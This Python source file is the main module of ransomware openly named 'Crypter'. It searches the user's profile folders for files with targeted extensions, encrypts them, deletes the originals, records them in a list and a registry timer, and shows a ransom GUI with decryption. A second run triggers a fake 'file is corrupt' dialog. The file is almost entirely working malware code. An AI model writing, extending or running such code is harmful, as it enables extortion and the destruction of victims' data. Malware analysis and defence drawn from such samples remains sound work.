'''
@summary: Crypter: Ransomware written entirely in python.
@author: MLS
@version: 2.0
'''

# Import libs
import os
import sys
import win32api
import winerror
import win32event
import _winreg
import wx
import time
import json

# Import classes
import Crypt
import Base
import Gui


###################
## CRYPTER Class ##
###################
class Crypter(Base.Base):
  '''
  @summary: Crypter: Controls interaction between relevant objects
  @author: MLS
  '''
  

  def __init__(self):
    '''
    @summary: Constructor
    '''
    self.__config = self.__load_config()
    self.encrypted_file_list = os.path.join(os.environ['APPDATA'], "encrypted_files.txt")

    # Init Crypt Lib
    self.Crypt = Crypt.SymmetricCrypto()

    # FIRST RUN
    # Encrypt!
    if not os.path.isfile(self.encrypted_file_list):
      self.Crypt.init_keys()
      file_list = self.find_files()
      # Start encryption
      self.encrypt_files(file_list)
      # If no files were encrypted. do nothing 
      if not os.path.isfile(self.encrypted_file_list):
          return
      # Present GUI
      self.start_gui()
    # ALREADY ENCRYPTED
    # Present menu
    elif os.path.isfile(self.encrypted_file_list):
      self.start_gui()
      
      
  def __load_config(self):
      '''
      @summary: Loads the runtime cfg file
      @return: JSON runtime config
      '''
      cfg_path = os.path.join(sys._MEIPASS, self.RUNTIME_CONFIG_FILE)
      
      with open(cfg_path, "r") as runtime_cfg_file:
          config = json.load(runtime_cfg_file)

      return config

      
  def get_start_time(self):
    '''
    @summary: Get's Crypter's start time from the registry, or creates it if it
    doesn't exist
    @return: The time that the ransomware began it's encryption operation, in integer epoch form 
    '''
    
    # Try to open registry key
    try:
      reg = _winreg.OpenKeyEx(_winreg.HKEY_CURRENT_USER, self.REGISTRY_LOCATION)
      start_time = _winreg.QueryValueEx(reg, "")[0]
      _winreg.CloseKey(reg)
    # If failure, create the key
    except WindowsError:
      start_time = int(time.time())
      reg = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, self.REGISTRY_LOCATION)
      _winreg.SetValue(reg, "", _winreg.REG_SZ, str(start_time))
      _winreg.CloseKey(reg)
        
    return start_time    


  def cleanup(self):
    '''
    @summary: Cleanups the system following successful decryption. Removed the list of
    encrypted files and deletes the Crypter registry key
    '''
    
    self.delete_encrypted_file_list()
    self.delete_registry_entries()


  def delete_registry_entries(self):
    '''
    @summary: Deletes the timer registry key
    '''
    
    # Open and delete the key
    reg = _winreg.OpenKeyEx(_winreg.HKEY_CURRENT_USER, self.REGISTRY_LOCATION)
    _winreg.DeleteKeyEx(reg, "")
    _winreg.CloseKey(reg)
    
      
  def start_gui(self):
    '''
    @summary: Initialises and launches the ransomware GUI screen
    '''
    
    # Get Crypter start_time
    start_time = self.get_start_time()
    
    app = wx.App()
    # TODO Update this to new path and place in __init__
    #sys._MEIPASS = "..\\build\\images"
    crypter_gui = Gui.Gui(
        image_path=sys._MEIPASS, 
        start_time=start_time,
        decrypter=self,
        config=self.__config)
                               
    crypter_gui.Show()
    app.MainLoop()
    

  def get_encrypted_files_list(self):
    '''
    @summary: Returns a list of the files encrypted by crypter
    @return: Encrypted file list
    '''

    # Get list of encrypted files
    try:
      with open(self.encrypted_file_list) as fh:
        file_list = fh.readlines()
      fh.close()
    except IOError:
      # Don't error, just return message
      raise Exception("A list of encrypted files was not found at: %s" % self.encrypted_file_list)
  
    return file_list


  def decrypt_file(self, encrypted_file, decryption_key):
    '''
    @summary: Processes the list of encrypted files and decrypts each. Should be called once per file
    @param encrypted_file: an encrypted file to decrypt
    '''

    # Decrypt!
    if not encrypted_file:
      return

    # IF successful decryption, delete locked file
    locked_path = self.Crypt.decrypt_file(encrypted_file.rstrip(), decryption_key, self.__config["encrypted_file_extension"])
    if locked_path:
      os.remove(locked_path)
      
      
  def delete_encrypted_file_list(self):
    '''
    @summary: Deletes the list of encrypted files
    '''

    # Remove encrypted file list
    os.remove(self.encrypted_file_list)


  def encrypt_files(self, file_list):
    '''
    @summary: Encrypts all files in the provided file list param
    @param file_list: A list of files to encrypt
    '''
    encrypted_files = []

    # Encrypt them and add to list if successful
    for file in file_list:

      # Encrypt file if less than specified file size
      if int(os.path.getsize(file)) < self.MAX_FILE_SIZE_BYTES:
        is_encrypted = self.Crypt.encrypt_file(file, self.__config["encrypted_file_extension"])
      else:
        is_encrypted = False

      # IF encrypted, try to delete the file and add to the list
      if is_encrypted:
        try:
          os.remove(file)
        # Ignore any exception, such as access denied, and continue
        except:
          continue
        encrypted_files.append(file)

    # Write out list of encrypted files
    if encrypted_files:
      fh = open(self.encrypted_file_list, "w")
      for encrypted_file in encrypted_files:
        fh.write(encrypted_file)
        fh.write("\n")
      fh.close()
      

  def find_files(self):
    '''
    @summary: Searches the file system and builds a list of files to encrypt
    @return: List of files matching the location and filetype criteria
    '''
    binary_name = os.path.split(sys.argv[0])[1]

    base_dirs = self.get_base_dirs(os.environ['USERPROFILE'])
    file_list = []

    for directory in base_dirs:
      for path,subdirs,files in os.walk(directory):
        for file in files:
          if os.path.isfile(os.path.join(path, file)):
            # Check file is valid
            if (
                (self.is_valid_filetype(file)) and
                (file.lower() not in self.FILES_TO_EXCLUDE) and
                (file.lower() != binary_name.lower())
                ):
                    file_list.append(os.path.join(path, file))
        for file in subdirs:
          if os.path.isfile(os.path.join(path, file)):
            # Check file is valid
            if (
                (self.is_valid_filetype(file)) and
                (file.lower() not in self.FILES_TO_EXCLUDE) and
                (file.lower() != binary_name.lower())
                ):
                    file_list.append(os.path.join(path, file))


    return file_list


  def is_valid_filetype(self, file):
    '''
    @summary: Verifies whether the specified file is of an acceptable type for encryption
    @param file: The file to check
    @attention: The list of filetypes to encrypt is defined in the Base.Base class
    '''

    # Split filename
    filename_components = file.split(".")

    # If no extension, return False
    if len(filename_components) <= 1:
      return False
    # Otherwise stringify extension
    else:
      full_extension = ".".join(filename_components[1:]).lower()

    # Check if extension is in the list of encryptable extensions
    for target_extension in self.__config["filetypes_to_encrypt"]:
        if len(target_extension) <= len(full_extension) and full_extension[-len(target_extension):] == target_extension.lower():
            return True
        
    return False
        

  
  
    return False


  def set_wallpaper(self):
    '''
    @summary: Sets the users wallpaper to a specific ransom not image
    @attention: FUNCTION NOW OBSOLETE. This method, and approach, is no longer used. The ransom
    note is now displayed via a WX GUI
    @requires: To enable this method, add an import for ctypes
    '''

    # Import image and write to path
    # todo adjust file name... maybe replace this with whatever is provided in the config file?
    image_path = os.path.join(sys._MEIPASS, "ransom.png")

    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, image_path, 3)


if __name__ == "__main__":

    ## START
    # Try to grab mutex control
    mutex = win32event.CreateMutex(None, 1, "mutex_rr_windows")
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
      # If mutex already exists, present corruption message
      mutex = None
      app = wx.App()
      error_dialog = wx.MessageDialog(None, "The file is corrupt and cannot be opened",
                                      "Error", wx.OK|wx.ICON_ERROR)
      error_dialog.ShowModal()
      app.MainLoop()
      sys.exit()

    # Otherwise run crypter
    else:
      go = Crypter()

